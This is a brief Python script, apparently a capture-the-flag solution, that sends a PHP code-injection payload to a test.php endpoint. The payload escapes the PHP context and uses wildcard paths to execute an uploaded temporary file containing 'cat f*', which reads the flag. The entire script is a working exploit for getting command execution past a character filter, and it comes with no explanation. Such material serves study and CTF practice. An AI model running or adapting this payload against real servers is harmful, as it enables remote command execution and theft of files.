# coding:utf-8
# author yu22x
import requests

url = "http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files = {'file': 'cat f*'}
response = requests.post(url, files=files)
html = response.text
print(html)
